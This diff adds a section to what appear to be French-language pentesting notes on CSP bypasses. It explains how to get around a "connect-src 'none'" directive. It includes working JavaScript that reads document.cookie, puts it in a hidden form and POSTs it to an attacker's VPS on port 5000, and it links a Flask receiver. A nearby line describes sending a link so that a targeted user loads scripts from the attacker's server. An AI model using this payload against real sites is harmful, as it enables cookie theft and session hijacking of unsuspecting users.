@@ -66,4 +66,23 @@ Si l'injection de balises est possible, mais que le CSP est bien configuré, mai
 
 En envoyant un lien à un autre utilisateur que l'on cible, il chargera tous les scripts de mon VPS au lieu des scripts du serveur web.
 
+## Contournement de "connect-src 'none'"
+
+Si la directive "connect-src" est à "none", on peut notamment passer par des requêtes POST avec un formulaire. 
+
+Serveur Flask minimaliste permettant de recevoir du POST : https://github.com/TimotheMaammar/Python/blob/main/Serveur.py
+
+Exemple de script externe fonctionnel pour exfiltrer un cookie de cette manière : 
+    
+        const form = document.createElement('form');
+        form.action = 'http://[VPS]:5000/';
+        form.method = 'POST';
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'x';
+        input.value = document.cookie
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+
 
